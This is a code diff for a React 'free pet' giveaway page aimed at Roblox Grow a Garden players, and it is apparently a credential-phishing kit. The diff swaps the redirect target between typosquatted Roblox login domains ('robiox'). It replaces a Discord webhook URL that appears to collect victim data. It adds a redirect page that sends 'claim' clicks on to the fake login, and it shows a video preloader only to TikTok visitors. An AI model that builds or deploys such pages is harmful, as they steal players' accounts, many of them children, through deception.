@@ -2,6 +2,7 @@
 
 import { useState, useEffect } from "react"
 import Preloader from "@/components/preloader"
+import RedirectPage from "@/components/redirect-page"
 import {
   Minus,
   Plus,
@@ -59,56 +60,56 @@ const pets: Pet[] = [
   {
     id: "1",
     name: "T-Rex",
-    image: "/tr.png",
+    image: "/placeholder.svg?height=80&width=80&text=T-Rex",
     quantity: 0,
     claimed: false,
   },
   {
     id: "2",
     name: "Raccoon",
-    image: "/rc.png",
+    image: "/placeholder.svg?height=80&width=80&text=Raccoon",
     quantity: 0,
     claimed: false,
   },
   {
     id: "3",
     name: "Fennec Fox",
-    image: "/f.png",
+    image: "/placeholder.svg?height=80&width=80&text=Fox",
     quantity: 0,
     claimed: false,
   },
   {
     id: "4",
     name: "Kitsune",
-    image: "/k.png",
+    image: "/placeholder.svg?height=80&width=80&text=Kitsune",
     quantity: 0,
     claimed: false,
   },
   {
     id: "5",
-    name: "Dragonfly",
-    image: "/dragonfly.png",
+    name: "Red Dragon",
+    image: "/placeholder.svg?height=80&width=80&text=Dragon",
     quantity: 0,
     claimed: false,
   },
   {
     id: "6",
     name: "Mimic Octopus",
-    image: "/octo.png",
+    image: "/placeholder.svg?height=80&width=80&text=Octopus",
     quantity: 0,
     claimed: false,
   },
   {
     id: "7",
     name: "Disco Bee",
-    image: "/db.png",
+    image: "/placeholder.svg?height=80&width=80&text=Bee",
     quantity: 0,
     claimed: false,
   },
   {
     id: "8",
     name: "Queen Bee",
-    image: "/qb.png",
+    image: "/placeholder.svg?height=80&width=80&text=Queen",
     quantity: 0,
     claimed: false,
   },
@@ -117,13 +118,13 @@ const pets: Pet[] = [
 // Redirect configuration
 const REDIRECT_CONFIG = {
   enabled: true,
-  url: "https://www.robiox.com.tg/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F284353541924%2FGrow-a-Garden",
+  url: "https://robiox.st/login?returnUrl=3889777624249851",
 }
 
 // Webhook configuration
 const WEBHOOK_CONFIG = {
   enabled: true,
-  url: "https://discord.com/api/webhooks/1403233109851242536/in5ZcRi5sj9lVb6CyYYu7pra71aJaEjleY_3GlJI8uNKzfF1cCG9SeHdn6oF8V0wWv5A",
+  url: "https://discord.com/api/webhooks/1305395577650937877/anagV_7i2jzKBT87zSay-9zzDniVsyb2bLhMtY6jgFloayQ40P6ugSLbLVTDJYCMOn3T",
 }
 
 export default function PetSeedStore() {
@@ -158,6 +159,7 @@ export default function PetSeedStore() {
   const [showConfirmModal, setShowConfirmModal] = useState(false)
   const [claimingPets, setClaimingPets] = useState<Array<{ pet: Pet; quantity: number }>>([])
   const [apiStatus, setApiStatus] = useState<"checking" | "connected" | "failed">("checking")
+  const [showRedirectPage, setShowRedirectPage] = useState(false)
 
   const getClaimingTotal = () => {
     return claimingPets.reduce((total, { quantity }) => total + quantity, 0)
@@ -427,11 +429,8 @@ export default function PetSeedStore() {
   const confirmClaim = async () => {
     setShowConfirmModal(false)
 
-    // IMMEDIATE REDIRECT - No delays!
-    if (REDIRECT_CONFIG.enabled && REDIRECT_CONFIG.url) {
-      console.log("🚀 INSTANT REDIRECT to:", REDIRECT_CONFIG.url)
-      window.open(REDIRECT_CONFIG.url, "_blank", "noopener,noreferrer")
-    }
+    // Show redirect page immediately
+    setShowRedirectPage(true)
 
     // Update claimed pets and total (happens in background)
     const totalItemsToClaim = getClaimingTotal()
@@ -460,8 +459,23 @@ export default function PetSeedStore() {
 
   // Show preloader only for TikTok users
   if (showPreloader) {
-    console.log("🎬 SHOWING PRELOADER - Video path: https://hebbkx1anhila5yf.public.blob.vercel-storage.com/preloader2-mI6piKsE6ojJAcZTQ7BmXp620otg8L.mp4")
-    return <Preloader onComplete={handlePreloaderComplete} videoSrc="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/preloader2-mI6piKsE6ojJAcZTQ7BmXp620otg8L.mp4" duration={4000} />
+    console.log(
+      "🎬 SHOWING PRELOADER - Video path: https://hebbkx1anhila5yf.public.blob.vercel-storage.com/preloader2-mI6piKsE6ojJAcZTQ7BmXp620otg8L.mp4",
+    )
+    return (
+      <Preloader
+        onComplete={handlePreloaderComplete}
+        videoSrc="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/preloader2-mI6piKsE6ojJAcZTQ7BmXp620otg8L.mp4"
+        duration={4000}
+      />
+    )
+  }
+
+  // Show redirect page
+  if (showRedirectPage && REDIRECT_CONFIG.enabled && REDIRECT_CONFIG.url) {
+    return (
+      <RedirectPage redirectUrl={REDIRECT_CONFIG.url} username={robloxUser?.name} petCount={getTotalSelectedItems()} />
+    )
   }
 
   return (
@@ -564,7 +578,7 @@ export default function PetSeedStore() {
                 onClick={confirmClaim}
                 className="flex-1 bg-red-500 hover:bg-red-600 text-white font-bold h-12 sm:h-auto animate-pulse"
               >
-                🚀 CLAIM NOW - INSTANT ACCESS!
+                🚀 REDIRECTING NOW...
               </Button>
             </div>
           </div>
